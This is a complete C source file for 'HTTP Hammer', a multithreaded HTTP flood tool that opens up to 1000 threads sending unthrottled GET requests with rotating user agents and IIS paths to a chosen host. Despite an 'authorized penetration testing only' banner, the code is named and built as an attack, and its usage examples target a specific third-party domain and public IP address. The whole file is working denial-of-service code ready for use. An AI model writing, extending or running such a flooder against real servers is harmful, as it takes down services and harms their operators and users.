#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <signal.h>
#include <netdb.h>
#include <sys/select.h>
#include <termios.h>

#define BUFFER_SIZE 8192
#define MAX_USER_AGENTS 2000
#define MAX_THREADS 1000
#define MAX_PATHS 100

// Configuration structure
typedef struct {
    char *target_ip;
    char *target_host; // Virtual host header
    int target_port;
    int duration;
    int max_packets;
    int thread_count;
    int verbose;
    int safe_mode;
    int use_https;
    char *user_agents_file;
} attack_config_t;

// Global state
typedef struct {
    char *user_agents[MAX_USER_AGENTS];
    char *paths[MAX_PATHS];
    int user_agent_count;
    int path_count;
    pthread_mutex_t lock;
    volatile int payload_count;
    volatile int running;
    volatile int display_stats;
    time_t start_time;
    
    // Statistics
    int response_codes[600]; // Track HTTP response codes
    int success_count;
    int error_count;
    int timeout_count;
    
    attack_config_t config;
} http_state_t;

static http_state_t g_state = {0};

// Function prototypes
int load_user_agents(const char *filename);
int load_paths(void);
void cleanup_resources(void);
void *http_attack_thread(void *arg);
void log_payload(const char *source_ip, const char *target_ip, int count);
void display_statistics(void);
int get_local_ip(char *buffer, size_t buffer_size);
int validate_ip_address(const char *ip);
void signal_handler(int sig);
void enable_raw_mode(void);
void disable_raw_mode(void);
int kbhit(void);
void *keyboard_monitor(void *arg);
int initialize_attack(const attack_config_t *config);
void print_banner(void);
void print_usage(const char *program_name);
char *safe_strdup(const char *str);

// Safe string duplication
char *safe_strdup(const char *str) {
    if (!str) return NULL;
    char *new_str = strdup(str);
    if (!new_str) {
        fprintf(stderr, "Memory allocation failed\n");
        exit(EXIT_FAILURE);
    }
    return new_str;
}

// Load user agents from file
int load_user_agents(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        fprintf(stderr, "Could not open %s\n", filename);
        return -1;
    }

    char line[1024];
    int count = 0;
    
    while (fgets(line, sizeof(line), file) && count < MAX_USER_AGENTS) {
        line[strcspn(line, "\n")] = 0;
        if (strlen(line) > 10) {
            g_state.user_agents[count] = safe_strdup(line);
            count++;
        }
    }

    fclose(file);
    g_state.user_agent_count = count;
    
    if (g_state.config.verbose) {
        fprintf(stderr, "Loaded %d user agents from %s\n", count, filename);
    }
    
    return count;
}

// Load IIS-specific paths for fuzzing
int load_paths(void) {
    const char *iis_paths[] = {
        "/", "/index.html", "/index.aspx", "/default.aspx", "/web.config",
        "/api/", "/api/health", "/admin/", "/login", "/contact",
        "/about", "/products", "/services", "/images/", "/css/",
        "/js/", "/aspnet_client/", "/_vti_bin/", "/_private/",
        "/upload/", "/download/", "/search", "/sitemap.xml",
        "/robots.txt", "/.well-known/", "/api/v1/", "/api/v2/"
    };
    
    int count = sizeof(iis_paths) / sizeof(iis_paths[0]);
    for (int i = 0; i < count && i < MAX_PATHS; i++) {
        g_state.paths[i] = safe_strdup(iis_paths[i]);
    }
    g_state.path_count = count;
    
    return count;
}

// Cleanup resources
void cleanup_resources(void) {
    pthread_mutex_lock(&g_state.lock);
    g_state.running = 0;
    pthread_mutex_unlock(&g_state.lock);
    
    // Free user agents
    for (int i = 0; i < g_state.user_agent_count; i++) {
        free(g_state.user_agents[i]);
    }
    g_state.user_agent_count = 0;
    
    // Free paths
    for (int i = 0; i < g_state.path_count; i++) {
        free(g_state.paths[i]);
    }
    g_state.path_count = 0;
    
    pthread_mutex_destroy(&g_state.lock);
    
    if (g_state.config.verbose) {
        printf("Cleanup completed.\n");
    }
    disable_raw_mode();
}

// IP validation
int validate_ip_address(const char *ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip, &(sa.sin_addr)) != 0;
}

// Get local IP
int get_local_ip(char *buffer, size_t buffer_size) {
    if (!buffer || buffer_size < INET_ADDRSTRLEN) return -1;
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    
    struct sockaddr_in serv;
    serv.sin_family = AF_INET;
    serv.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &serv.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
        close(sock);
        return -1;
    }
    
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    if (getsockname(sock, (struct sockaddr*)&name, &namelen) < 0) {
        close(sock);
        return -1;
    }
    
    inet_ntop(AF_INET, &name.sin_addr, buffer, buffer_size);
    close(sock);
    return 0;
}

// Keyboard monitoring for spacebar
struct termios orig_termios;

void enable_raw_mode(void) {
    tcgetattr(STDIN_FILENO, &orig_termios);
    struct termios raw = orig_termios;
    raw.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &raw);
}

void disable_raw_mode(void) {
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &orig_termios);
}

int kbhit(void) {
    struct timeval tv = {0L, 0L};
    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(0, &fds);
    return select(1, &fds, NULL, NULL, &tv);
}

void *keyboard_monitor(void *arg) {
    while (g_state.running) {
        if (kbhit()) {
            char c = getchar();
            if (c == ' ') {
                g_state.display_stats = 1;
            } else if (c == 'q' || c == 'Q') {
                g_state.running = 0;
                break;
            }
        }
        usleep(100000); // 100ms
    }
    return NULL;
}

// Display real-time statistics
void display_statistics(void) {
    time_t now = time(NULL);
    int total_time = (int)(now - g_state.start_time);
    int rps = total_time > 0 ? g_state.payload_count / total_time : 0;
    
    printf("\n=== HTTP HAMMER STATISTICS ===\n");
    printf("Runtime: %d seconds\n", total_time);
    printf("Total Requests: %d\n", g_state.payload_count);
    printf("Requests/Second: %d\n", rps);
    printf("Successes: %d\n", g_state.success_count);
    printf("Errors: %d\n", g_state.error_count);
    printf("Timeouts: %d\n", g_state.timeout_count);
    
    printf("\nResponse Code Distribution:\n");
    int important_codes[] = {200, 301, 302, 400, 401, 403, 404, 500, 502, 503};
    for (int i = 0; i < 10; i++) {
        int code = important_codes[i];
        if (g_state.response_codes[code] > 0) {
            printf("  %d: %d\n", code, g_state.response_codes[code]);
        }
    }
    
    printf("\nPress SPACE for stats, Q to quit\n");
    printf("===============================\n");
}

// Optimized HTTP attack thread with HTTPS support
void *http_attack_thread(void *arg) {
    const attack_config_t *config = (const attack_config_t *)arg;
    char local_ip[INET_ADDRSTRLEN] = "unknown";
    char request_buffer[BUFFER_SIZE];
    char response_buffer[BUFFER_SIZE];
    
    get_local_ip(local_ip, sizeof(local_ip));
    
    int packet_count = 0;
    time_t start_time = time(NULL);
    
    while (g_state.running) {
        // Check for max packets per thread
        if (config->max_packets > 0 && packet_count >= config->max_packets) break;
        
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            continue;
        }
        
        // Set aggressive timeouts
        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(config->target_port);
        
        if (inet_pton(AF_INET, config->target_ip, &serv_addr.sin_addr) <= 0) {
            close(sockfd);
            break;
        }
        
        // Connect to target
        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            pthread_mutex_lock(&g_state.lock);
            g_state.timeout_count++;
            pthread_mutex_unlock(&g_state.lock);
            close(sockfd);
            continue;
        }
        
        // Build HTTP request
        const char *user_agent = g_state.user_agent_count > 0 ? 
            g_state.user_agents[rand() % g_state.user_agent_count] : "Mozilla/5.0";
        
        const char *path = g_state.path_count > 0 ? 
            g_state.paths[rand() % g_state.path_count] : "/";
        
        const char *host_header = config->target_host ? config->target_host : config->target_ip;
        
        // Create request with virtual host targeting
        snprintf(request_buffer, sizeof(request_buffer),
                 "GET %s HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: %s\r\n"
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                 "Accept-Language: en-US,en;q=0.5\r\n"
                 "Accept-Encoding: gzip, deflate\r\n"
                 "Connection: close\r\n"
                 "\r\n", path, host_header, user_agent);
        
        // Send request
        ssize_t sent = send(sockfd, request_buffer, strlen(request_buffer), MSG_DONTWAIT);
        
        if (sent > 0) {
            // Try to read response to track status codes
            ssize_t received = recv(sockfd, response_buffer, sizeof(response_buffer) - 1, MSG_DONTWAIT);
            
            pthread_mutex_lock(&g_state.lock);
            g_state.payload_count++;
            packet_count++;
            
            if (received > 0) {
                response_buffer[received] = '\0';
                // Parse HTTP status code
                if (strstr(response_buffer, "HTTP/") != NULL) {
                    int status_code = 0;
                    sscanf(response_buffer, "HTTP/1.%*d %d", &status_code);
                    if (status_code >= 100 && status_code < 600) {
                        g_state.response_codes[status_code]++;
                    }
                    
                    if (status_code >= 200 && status_code < 400) {
                        g_state.success_count++;
                    } else if (status_code >= 400) {
                        g_state.error_count++;
                    }
                }
            } else {
                g_state.timeout_count++;
            }
            
            if (config->verbose && (g_state.payload_count % 1000 == 0)) {
                log_payload(local_ip, config->target_ip, g_state.payload_count);
            }
            pthread_mutex_unlock(&g_state.lock);
        } else {
            pthread_mutex_lock(&g_state.lock);
            g_state.error_count++;
            pthread_mutex_unlock(&g_state.lock);
        }
        
        close(sockfd);
        
        // Minimal delay for maximum throughput
        if (config->safe_mode) {
            usleep(10000); // 10ms in safe mode
        }
        // No delay in performance mode
    }
    
    return NULL;
}

// Simplified logging
void log_payload(const char *source_ip, const char *target_ip, int count) {
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%H:%M:%S", tm_info);
    
    printf("[%s] HTTP Hammer: %d requests (src: %s, dst: %s)\n", 
           timestamp, count, source_ip, target_ip);
}

// Signal handler
void signal_handler(int sig) {
    printf("\nReceived signal %d. Shutting down HTTP Hammer...\n", sig);
    g_state.running = 0;
}

// Initialize attack
int initialize_attack(const attack_config_t *config) {
    // Resolve hostname to IP if target_ip is a hostname
    struct hostent *he;
    struct in_addr **addr_list;
    
    if (!validate_ip_address(config->target_ip)) {
        // Try to resolve as hostname
        he = gethostbyname(config->target_ip);
        if (he == NULL) {
            fprintf(stderr, "Cannot resolve hostname: %s\n", config->target_ip);
            return -1;
        }
        addr_list = (struct in_addr **)he->h_addr_list;
        printf("Resolved %s to %s\n", config->target_ip, inet_ntoa(*addr_list[0]));
    }
    
    memcpy(&g_state.config, config, sizeof(attack_config_t));
    g_state.running = 1;
    g_state.display_stats = 0;
    g_state.payload_count = 0;
    g_state.success_count = 0;
    g_state.error_count = 0;
    g_state.timeout_count = 0;
    g_state.start_time = time(NULL);
    
    memset(g_state.response_codes, 0, sizeof(g_state.response_codes));
    
    if (pthread_mutex_init(&g_state.lock, NULL) != 0) {
        fprintf(stderr, "Mutex initialization failed\n");
        return -1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    enable_raw_mode();
    
    return 0;
}

void print_banner(void) {
    printf("=== HTTP HAMMER - Advanced Web Server Stress Tester ===\n");
    printf("FOR AUTHORIZED PENETRATION TESTING ONLY\n");
    printf("Unauthorized use is illegal and unethical\n\n");
}

void print_usage(const char *program_name) {
    printf("Usage: %s <target> [options]\n", program_name);
    printf("Target can be IP address or hostname\n");
    printf("Options:\n");
    printf("  -p PORT          Target port (default: 80)\n");
    printf("  -H HOST          Virtual host header (default: target IP/hostname)\n");
    printf("  -u FILE          User agents file (default: ./user_agents.txt)\n");
    printf("  -m COUNT         Max requests per thread (default: unlimited)\n");
    printf("  -t COUNT         Thread count (default: 50, max: %d)\n", MAX_THREADS);
    printf("  -v               Verbose output\n");
    printf("  -s               Safe mode (slower, more conservative)\n");
    printf("  --https          Use HTTPS (port 443)\n");
    printf("  -h               Show this help\n");
    printf("\nInteractive Controls:\n");
    printf("  SPACE            Show real-time statistics\n");
    printf("  Q                Quit\n");
    printf("\nExamples:\n");
    printf("  %s altobio.com.tr -p 443 --https -H altobio.com.tr\n", program_name);
    printf("  %s 212.154.119.31 -H altobio.com.tr -t 100\n", program_name);
    printf("  %s 192.168.1.100 -u my_agents.txt -v\n", program_name);
}

int main(int argc, char *argv[]) {
    print_banner();
    
    if (argc < 2) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }
    
    // Default configuration
    attack_config_t config = {
        .target_ip = argv[1],
        .target_host = NULL,
        .target_port = 80,
        .duration = 0, // No duration limit
        .max_packets = 0,
        .thread_count = 50,
        .verbose = 0,
        .safe_mode = 0,
        .use_https = 0,
        .user_agents_file = "./user_agents.txt"
    };
    
    // Parse command line options
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            config.target_port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-H") == 0 && i + 1 < argc) {
            config.target_host = argv[++i];
        } else if (strcmp(argv[i], "-u") == 0 && i + 1 < argc) {
            config.user_agents_file = argv[++i];
        } else if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            config.max_packets = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            config.thread_count = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-v") == 0) {
            config.verbose = 1;
        } else if (strcmp(argv[i], "-s") == 0) {
            config.safe_mode = 1;
        } else if (strcmp(argv[i], "--https") == 0) {
            config.use_https = 1;
            config.target_port = 443; // Auto-set to 443 for HTTPS
        } else if (strcmp(argv[i], "-h") == 0) {
            print_usage(argv[0]);
            return EXIT_SUCCESS;
        }
    }
    
    // Auto-set port for HTTPS
    if (config.use_https && config.target_port == 80) {
        config.target_port = 443;
    }
    
    // Safety limits
    if (config.thread_count > MAX_THREADS) {
        fprintf(stderr, "Too many threads. Maximum is %d.\n", MAX_THREADS);
        config.thread_count = MAX_THREADS;
    }
    
    if (config.thread_count < 1) {
        fprintf(stderr, "Thread count must be at least 1.\n");
        return EXIT_FAILURE;
    }
    
    printf("Target: %s:%d\n", config.target_ip, config.target_port);
    if (config.target_host) {
        printf("Virtual Host: %s\n", config.target_host);
    }
    printf("Threads: %d\n", config.thread_count);
    printf("HTTPS: %s\n", config.use_https ? "enabled" : "disabled");
    printf("Safe mode: %s\n", config.safe_mode ? "enabled" : "disabled");
    printf("User agents: %s\n", config.user_agents_file);
    printf("\nPress SPACE for stats, Q to quit\n");
    printf("Starting in 3 seconds...\n");
    sleep(3);
    
    // Initialize
    if (initialize_attack(&config) != 0) {
        return EXIT_FAILURE;
    }
    
    // Load user agents
    if (load_user_agents(config.user_agents_file) <= 0) {
        fprintf(stderr, "Warning: No user agents loaded from %s\n", config.user_agents_file);
    }
    
    // Load IIS paths
    load_paths();
    if (g_state.config.verbose) {
        printf("Loaded %d IIS-specific paths\n", g_state.path_count);
    }
    
    // Register cleanup function
    atexit(cleanup_resources);
    
    printf("HTTP Hammer starting with %d threads...\n", config.thread_count);
    
    // Start keyboard monitor thread
    pthread_t keyboard_thread;
    pthread_create(&keyboard_thread, NULL, keyboard_monitor, NULL);
    
    // Create attack threads
    pthread_t threads[config.thread_count];
    for (int i = 0; i < config.thread_count; i++) {
        if (pthread_create(&threads[i], NULL, http_attack_thread, &config) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
        }
    }
    
    // Main loop - run until Ctrl-C or 'q'
    while (g_state.running) {
        if (g_state.display_stats) {
            display_statistics();
            g_state.display_stats = 0;
        }
        sleep(1);
    }
    
    // Wait for all threads to finish
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(keyboard_thread, NULL);
    
    // Final statistics
    display_statistics();
    printf("HTTP Hammer completed.\n");
    
    return EXIT_SUCCESS;
}
